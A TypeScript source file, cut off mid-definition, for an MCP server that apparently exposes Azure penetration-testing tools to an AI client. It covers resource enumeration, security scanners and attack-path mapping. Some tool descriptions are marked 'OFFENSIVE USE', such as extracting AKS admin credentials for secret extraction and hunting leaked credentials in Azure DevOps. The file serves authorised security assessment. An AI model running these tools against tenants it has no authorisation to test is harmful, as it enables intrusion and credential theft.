#!/usr/bin/env node
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  CompleteRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { readFileSync } from 'fs';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

// Read version from package.json (single source of truth)
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const packageJson = JSON.parse(readFileSync(join(__dirname, '../package.json'), 'utf-8'));
const SERVER_VERSION = packageJson.version;

import { AzureCliCredential, DefaultAzureCredential, ChainedTokenCredential } from "@azure/identity";
import { SubscriptionClient } from "@azure/arm-subscriptions";
import { ResourceManagementClient } from "@azure/arm-resources";
import { StorageManagementClient } from "@azure/arm-storage";
import { NetworkManagementClient } from "@azure/arm-network";
import { AuthorizationManagementClient } from "@azure/arm-authorization";
import { SqlManagementClient } from "@azure/arm-sql";
import { KeyVaultManagementClient } from "@azure/arm-keyvault";
import { CosmosDBManagementClient } from "@azure/arm-cosmosdb";
import { ComputeManagementClient } from "@azure/arm-compute";
import { ContainerServiceClient } from "@azure/arm-containerservice";
import { ContainerRegistryManagementClient } from "@azure/arm-containerregistry";
import { BlobServiceClient } from "@azure/storage-blob";
import * as azdev from "azure-devops-node-api";
import PDFDocument from "pdfkit";
import { marked } from "marked";
import { createObjectCsvWriter } from "csv-writer";
import * as fs from "fs";
import * as path from "path";
import * as k8s from "@kubernetes/client-node";

// Error Handling & Logging Infrastructure (v1.10.7)
import { logger, performanceTracker } from "./logging.js";
import { normalizeError, MCPError, ValidationError, formatErrorMarkdown, formatErrorJSON } from "./errors.js";
import { retry, retryWithTimeout } from "./retry.js";

// Initialize Azure credential - PRIORITIZE Azure CLI over VS Code extension
// This fixes the issue where VS Code's internal service principal is used instead of user's az login
const credential = new ChainedTokenCredential(
  new AzureCliCredential(),      // Try Azure CLI first (your az login)
  new DefaultAzureCredential()   // Fallback to other methods
);

// All Azure regions/locations
const AZURE_LOCATIONS = [
  // Americas
  "eastus", "eastus2", "westus", "westus2", "westus3", "centralus", "northcentralus", "southcentralus", "westcentralus",
  "canadacentral", "canadaeast", "brazilsouth", "brazilsoutheast",
  // Europe
  "northeurope", "westeurope", "uksouth", "ukwest", "francecentral", "francesouth",
  "germanywestcentral", "germanynorth", "switzerlandnorth", "switzerlandwest",
  "norwayeast", "norwaywest", "swedencentral", "polandcentral", "italynorth", "spaincentral",
  // Asia Pacific
  "eastasia", "southeastasia", "australiaeast", "australiasoutheast", "australiacentral", "australiacentral2",
  "japaneast", "japanwest", "koreacentral", "koreasouth",
  "centralindia", "southindia", "westindia", "jioindiawest", "jioindiacentral",
  // Middle East & Africa
  "uaenorth", "uaecentral", "qatarcentral", "southafricanorth", "southafricawest", "israelcentral"
];

// Common Azure locations (most used)
const COMMON_LOCATIONS = [
  "eastus", "eastus2", "westus2", "westeurope", "northeurope",
  "southeastasia", "australiaeast", "uksouth", "centralindia", "japaneast"
];

// Helper to resolve locations from user input
function resolveLocations(location?: string): string[] | null {
  if (!location) return null; // No filter - return all
  if (location.toLowerCase() === "all") return AZURE_LOCATIONS;
  if (location.toLowerCase() === "common") return COMMON_LOCATIONS;
  return location.split(",").map(l => l.trim().toLowerCase());
}

// Helper to filter resources by location
function filterByLocation<T extends { location?: string }>(resources: T[], locations: string[] | null): T[] {
  if (!locations) return resources; // No filter
  return resources.filter(r => r.location && locations.includes(r.location.toLowerCase()));
}

// Helper to format tool output based on format parameter
function formatResponse(data: any, format: string | undefined, toolName: string): string {
  // Default to markdown for backward compatibility
  format = format || 'markdown';
  
  // Validate format parameter
  if (format !== 'markdown' && format !== 'json') {
    throw new Error(`Invalid format: ${format}. Must be 'markdown' or 'json'.`);
  }
  
  if (format === 'json') {
    // Wrap in structured envelope with metadata
    return JSON.stringify({
      tool: toolName,
      format: 'json',
      timestamp: new Date().toISOString(),
      data: typeof data === 'string' ? { markdownOutput: data } : data
    }, null, 2);
  }
  
  // Markdown mode: return raw result unchanged (backward compatible)
  return typeof data === 'string' ? data : JSON.stringify(data);
}

// INPUT VALIDATION (Security Enhancement)

/**
 * Azure resource ID patterns for validation
 */
const AZURE_PATTERNS = {
  subscriptionId: /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i,
  resourceGroup: /^[-\w._()]+$/,
  resourceName: /^[a-zA-Z0-9][-a-zA-Z0-9._]{0,78}[a-zA-Z0-9]$/,
  location: /^[a-z]+$/,
  outputFormat: /^(markdown|json)$/,
  scanMode: /^(common|all)$/,
  email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
};

/**
 * Valid Azure resource types for multi-location scanning
 */
const VALID_RESOURCE_TYPES = [
  "vms", "storage", "nsgs", "aks", "sql", "keyvaults", "public_ips", "all"
];

/**
 * Validate generic string input with sanitization
 */
function validateInput(
  input: string | undefined,
  options: {
    required?: boolean;
    maxLength?: number;
    pattern?: RegExp;
    patternName?: string;
    allowedValues?: string[];
  } = {}
): string | undefined {
  if (input === undefined || input === null || input === '') {
    if (options.required) {
      throw new ValidationError('Required input is missing', { field: 'input' });
    }
    return undefined;
  }
  
  // Sanitize: trim and remove control characters
  const sanitized = input.toString().trim().replace(/[\x00-\x1f\x7f]/g, '');
  
  // Length check
  const maxLen = options.maxLength || 1000;
  if (sanitized.length > maxLen) {
    throw new ValidationError(
      `Input exceeds maximum length of ${maxLen} characters`,
      { provided: sanitized.length, maxLength: maxLen }
    );
  }
  
  // Allowed values check
  if (options.allowedValues && !options.allowedValues.includes(sanitized)) {
    throw new ValidationError(
      `Invalid value: ${sanitized}. Allowed: ${options.allowedValues.join(', ')}`,
      { provided: sanitized, allowed: options.allowedValues }
    );
  }
  
  // Pattern validation
  if (options.pattern && !options.pattern.test(sanitized)) {
    const name = options.patternName || 'input';
    throw new ValidationError(
      `Invalid ${name} format: ${sanitized}`,
      { provided: sanitized, pattern: options.pattern.toString() }
    );
  }
  
  return sanitized;
}

/**
 * Validate Azure subscription ID
 */
function validateSubscriptionId(subscriptionId: string | undefined, required: boolean = true): string | undefined {
  if (!subscriptionId && !required) return undefined;
  if (!subscriptionId && required) {
    throw new ValidationError('Subscription ID is required', { field: 'subscriptionId' });
  }
  
  return validateInput(subscriptionId, {
    required,
    pattern: AZURE_PATTERNS.subscriptionId,
    patternName: 'subscription ID',
    maxLength: 36,
  });
}

/**
 * Validate Azure location
 */
function validateLocation(location: string | undefined, allowMultiple: boolean = false): string | undefined {
  if (!location) return undefined;
  
  const sanitized = location.trim().toLowerCase();
  
  // Allow special values
  if (sanitized === 'all' || sanitized === 'common') {
    return sanitized;
  }
  
  // Allow comma-separated values if allowMultiple
  if (allowMultiple && sanitized.includes(',')) {
    const locations = sanitized.split(',').map(l => l.trim());
    locations.forEach(loc => {
      if (!AZURE_PATTERNS.location.test(loc) && !AZURE_LOCATIONS.includes(loc) && !COMMON_LOCATIONS.includes(loc)) {
        throw new Error(`Invalid Azure location: ${loc}`);
      }
    });
    return sanitized;
  }
  
  // Single location validation
  if (!AZURE_PATTERNS.location.test(sanitized)) {
    throw new Error(`Invalid Azure location format: ${location}`);
  }
  
  // Whitelist check
  if (!AZURE_LOCATIONS.includes(sanitized) && !COMMON_LOCATIONS.includes(sanitized)) {
    throw new Error(`Unknown Azure location: ${location}. Use one of: ${COMMON_LOCATIONS.slice(0, 5).join(', ')}...`);
  }
  
  return sanitized;
}

/**
 * Validate resource type
 */
function validateResourceType(resourceType: string | undefined): string {
  if (!resourceType) {
    throw new Error('Resource type is required');
  }
  
  return validateInput(resourceType, {
    required: true,
    allowedValues: VALID_RESOURCE_TYPES,
    patternName: 'resource type',
  })!;
}

/**
 * Validate output format
 */
function validateOutputFormat(format: string | undefined): 'markdown' | 'json' {
  if (!format) return 'markdown';
  
  const sanitized = format.trim().toLowerCase();
  if (sanitized !== 'markdown' && sanitized !== 'json') {
    throw new Error(`Invalid format: ${format}. Must be 'markdown' or 'json'.`);
  }
  
  return sanitized as 'markdown' | 'json';
}

/**
 * Validate resource group name
 */
function validateResourceGroup(resourceGroup: string | undefined, required: boolean = false): string | undefined {
  return validateInput(resourceGroup, {
    required,
    maxLength: 90,
    pattern: AZURE_PATTERNS.resourceGroup,
    patternName: 'resource group',
  });
}

/**
 * Validate resource name
 */
function validateResourceName(resourceName: string | undefined, required: boolean = false): string | undefined {
  return validateInput(resourceName, {
    required,
    maxLength: 80,
    pattern: AZURE_PATTERNS.resourceName,
    patternName: 'resource name',
  });
}

// Create MCP server instance
const server = new Server(
  {
    name: "stratos-mcp",
    "version": SERVER_VERSION,
  },
  {
    capabilities: {
      tools: {},
      completions: {},
    },
  }
);

// List available tools
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return {
    tools: [
      {
        name: "azure_help",
        description: "Display comprehensive help information about all available Azure penetration testing tools and usage examples",
        inputSchema: {
          type: "object",
          properties: {},
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: true,
          openWorld: false
        }
      },
      {
        name: "azure_list_active_locations",
        description: "Discover which Azure locations have resources deployed. Quick scan to identify active regions before deep scanning. Checks resource groups, VMs, storage accounts, and AKS clusters.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            scanMode: {
              type: "string",
              enum: ["common", "all"],
              description: "Preset scan mode: 'common' (10 locations) or 'all' (45+ locations). Default: common",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_all_locations",
        description: "Scan multiple Azure locations for resources. Supports: vms, storage, nsgs, aks, sql, keyvaults, public_ips, all. Specify custom locations OR use presets ('common'=10 locations, 'all'=45+ locations).",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceType: {
              type: "string",
              enum: ["vms", "storage", "nsgs", "aks", "sql", "keyvaults", "public_ips", "all"],
              description: "Type of resource to scan: vms, storage, nsgs, aks, sql, keyvaults, public_ips, all",
            },
            locations: {
              type: "string",
              description: "Custom locations to scan (comma-separated). Examples: 'eastus' or 'eastus,westeurope,southeastasia'. Use 'common' for 10 main locations or 'all' for 45+ locations.",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceType"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_subscriptions",
        description: "Enumerate all Azure subscriptions accessible with current credentials. Returns subscription ID, name, state, and tenant ID.",
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        },
        inputSchema: {
          type: "object",
          properties: {
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
        },
      },
      {
        name: "azure_enumerate_resource_groups",
        description: "Enumerate all resource groups in a specific subscription. Returns name, location, ID, and tags. Supports location filtering.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)",
            },
            location: {
              type: "string",
              description: "Filter by location(s): single (e.g., 'eastus'), multiple (e.g., 'eastus,westeurope'), or preset ('common', 'all')",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_resources",
        description: "Enumerate all resources in a subscription or resource group. Can filter by resource type and location. Returns resource name, type, location, ID, and tags.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Resource group name to filter by",
            },
            resourceType: {
              type: "string",
              description: "Optional: Filter by resource type (e.g., Microsoft.Storage/storageAccounts, Microsoft.Compute/virtualMachines, Microsoft.Network/networkSecurityGroups)",
            },
            location: {
              type: "string",
              description: "Filter by location(s): single (e.g., 'eastus'), multiple (e.g., 'eastus,westeurope'), or preset ('common', 'all')",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_get_resource_details",
        description: "Get detailed configuration and properties of a specific Azure resource. Useful for analyzing security settings, network configs, encryption status, etc.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name",
            },
            resourceProvider: {
              type: "string",
              description: "Resource provider (e.g., Microsoft.Storage, Microsoft.Compute, Microsoft.Network)",
            },
            resourceType: {
              type: "string",
              description: "Resource type (e.g., storageAccounts, virtualMachines, networkSecurityGroups)",
            },
            resourceName: {
              type: "string",
              description: "Resource name",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "resourceProvider", "resourceType", "resourceName"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_storage_security",
        description: "Analyze security configuration of all storage accounts in a subscription. Checks: public blob access, firewall rules, encryption, secure transfer (HTTPS), private endpoints, minimum TLS version. Returns prioritized security findings with risk levels (CRITICAL/HIGH/MEDIUM/LOW).",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_nsg_rules",
        description: "Automated Network Security Group (NSG) security analysis. Identifies: open management ports (RDP 3389, SSH 22, WinRM 5985/5986), database ports (SQL 1433, MySQL 3306, PostgreSQL 5432, MongoDB 27017), wildcard source rules (0.0.0.0/0, Internet, Any), overly permissive rules. Returns findings with risk severity and remediation recommendations.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            nsgName: {
              type: "string",
              description: "Optional: Analyze specific NSG by name",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_public_ips",
        description: "Enumerate all public IP addresses in a subscription to map internet-exposed attack surface. Returns: IP address, DNS name, allocation method (Static/Dynamic), associated resource (VM, Load Balancer, App Gateway, etc.), resource group, location. Critical for identifying external entry points.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_rbac_assignments",
        description: "Enumerate Role-Based Access Control (RBAC) assignments to identify who has access to what. Returns: principal name and type (User/ServicePrincipal/Group), role definition (Owner/Contributor/Reader/Custom), scope (Subscription/ResourceGroup/Resource), principal ID. Useful for identifying privileged accounts, service principals with excessive permissions, and potential privilege escalation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            scope: {
              type: "string",
              description: "Optional: Specific scope to analyze (e.g., /subscriptions/{id}/resourceGroups/{rg}). If not provided, analyzes entire subscription.",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_sql_databases",
        description: "Comprehensive SQL Database security scanner. Checks: TDE encryption status, firewall rules (detects 0.0.0.0-255.255.255.255 allow-all), Azure AD authentication vs SQL auth, auditing enabled, public endpoint exposure, threat detection. Returns CRITICAL/HIGH/MEDIUM findings with CWE references and attack vectors.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_keyvault_security",
        description: "Key Vault security assessment. Checks: soft delete disabled (data loss risk), purge protection disabled, public network access enabled, RBAC vs Access Policies, secret/certificate expiration, diagnostic logging. Returns risk-scored findings (CRITICAL/HIGH/MEDIUM/LOW) with remediation guidance.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_cosmosdb_security",
        description: "Cosmos DB security analyzer. Checks: public network access enabled, firewall rules (IP restrictions), encryption at rest, automatic failover, backup retention policy, virtual network rules. Returns security findings with compliance mapping.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_vm_security",
        description: "Virtual Machine security scanner. Checks: OS disk encryption (BitLocker/dm-crypt), data disk encryption, security extensions (Microsoft Defender, Azure Monitor Agent), boot diagnostics storage access, patch management status, Just-in-Time VM access. Returns vulnerability findings with exploitation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_acr_security",
        description: "Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning enabled (Defender for Containers), content trust (image signing), network rules, anonymous pull access. Returns container security findings.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_service_principals",
        description: "Enumerate all service principals (application identities) in the tenant. Returns: service principal names, application IDs, credential expiration dates, application permissions (Microsoft Graph API), owner information, orphaned/unused SPNs. Critical for identifying over-privileged applications and credential lifecycle management.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID (used for authentication context)",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_enumerate_managed_identities",
        description: "Enumerate all managed identities (system-assigned and user-assigned) across subscription. Returns: identity type, associated resources, role assignments, scope of access, cross-subscription permissions. Essential for understanding passwordless authentication patterns and potential privilege escalation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_storage_containers",
        description: "Deep scan of storage account containers and blobs. Lists all containers, checks container-level public access, enumerates blobs, detects sensitive files (backups, configs, keys: *.bak, web.config, appsettings.json, *.key, *.pem, *.sql). Identifies SAS tokens, checks blob encryption, finds orphaned blobs. CRITICAL for data exposure assessment.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            storageAccountName: {
              type: "string",
              description: "Optional: Scan specific storage account. If omitted, scans all storage accounts with public blob access.",
            },
            maxBlobsPerContainer: {
              type: "number",
              description: "Optional: Maximum blobs to list per container (default: 100, prevents timeout on large containers)",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_generate_security_report",
        description: "Generate comprehensive security assessment report from scan results. NEW: Supports PDF, HTML, CSV export. Produces executive summary, risk prioritization, findings by severity (CRITICAL/HIGH/MEDIUM/LOW), remediation matrix, compliance mapping (CIS/NIST), and detailed vulnerability analysis. Aggregates all security scanner results into professional deliverable.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID to report on",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              description: "Output format: 'markdown' (default), 'json', 'html', 'pdf', or 'csv'",
              enum: ["markdown", "json", "html", "pdf", "csv"],
            },
            outputFile: {
              type: "string",
              description: "Optional: Save report to file (e.g., C:\\\\reports\\\\security-report.pdf)",
            },
            fullScan: {
              type: "boolean",
              description: "Run comprehensive scan using all 25 tools (default: false - quick scan only)",
            },
            includeRemediation: {
              type: "boolean",
              description: "Include detailed remediation guidance (default: true)",
            },
            includeCompliance: {
              type: "boolean",
              description: "Include compliance framework mapping (default: true)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_attack_paths",
        description: "Identify and map attack paths from public exposure to sensitive resources. Analyzes: privilege escalation chains (RBAC roles → resources), lateral movement opportunities (VM → managed identity → secrets), exposed credentials to resource access, public IP → NSG → VM → identity → data flows. Returns exploitation scenarios with step-by-step attack chains.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID to analyze",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            startFrom: {
              type: "string",
              description: "Optional: Starting point for attack path analysis ('public-ips', 'storage', 'vms', 'identities'). Default: analyze all entry points.",
              enum: ["public-ips", "storage", "vms", "identities", "all"],
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_get_aks_credentials",
        description: "Extract AKS cluster credentials and kubeconfig for kubectl access. Returns: cluster FQDN, API server endpoint, admin credentials (if available), service principal details, managed identity info. OFFENSIVE USE: Obtain cluster access for manual kubectl exploitation, RBAC testing, pod deployment, secret extraction.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name containing AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            adminAccess: {
              type: "boolean",
              description: "Attempt to get admin credentials (requires Azure RBAC permissions). Default: false (user credentials)",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_scan_azure_devops",
        description: "Azure DevOps security scanner. Enumerates: organizations, projects, repositories, pipelines, service connections, variable groups, PAT tokens. Checks for: exposed secrets in repos, over-privileged service connections, insecure pipeline configurations, leaked credentials. OFFENSIVE USE: Find deployment credentials, API keys in source code, service principal secrets in pipelines.",
        inputSchema: {
          type: "object",
          properties: {
            organizationUrl: {
              type: "string",
              description: "Azure DevOps organization URL (e.g., https://dev.azure.com/yourorg)",
            },
            personalAccessToken: {
              type: "string",
              description: "Personal Access Token (PAT) for authentication - requires Read access to Code, Build, Release",
            },
            scanRepositories: {
              type: "boolean",
              description: "Scan repositories for hardcoded secrets (default: true)",
            },
            scanPipelines: {
              type: "boolean",
              description: "Scan pipelines for exposed credentials (default: true)",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["organizationUrl", "personalAccessToken"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_function_apps",
        description: "Azure Functions security analysis: authentication settings, managed identity, VNet integration, CORS configuration, application settings for secrets, runtime version vulnerabilities",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_app_service_security",
        description: "App Service security analysis: HTTPS-only, minimum TLS version, authentication, managed identity, VNet integration, IP restrictions, remote debugging status",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_firewall_policies",
        description: "Azure Firewall and NSG rule analysis: overly permissive rules, any-to-any rules, management port exposure, threat intelligence integration",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_logic_apps",
        description: "Logic Apps security analysis: authentication, access control, managed identity usage, exposed endpoints, workflow triggers security",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              enum: ["markdown", "json"],
              description: "Output format: 'markdown' (default, human-readable) or 'json' (machine-readable)",
            },
          },
          required: ["subscriptionId"],
        },
        annotations: {
          readOnly: true,
          destructive: false,
          idempotent: false,
          openWorld: true
        }
      },
      {
        name: "azure_analyze_rbac_privesc",
        description: "Deep RBAC analysis for privilege escalation paths: role assignment permissions, custom role vulnerabilities, subscription-level access, management group permissions",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            targetPrincipal: {
              type: "string",
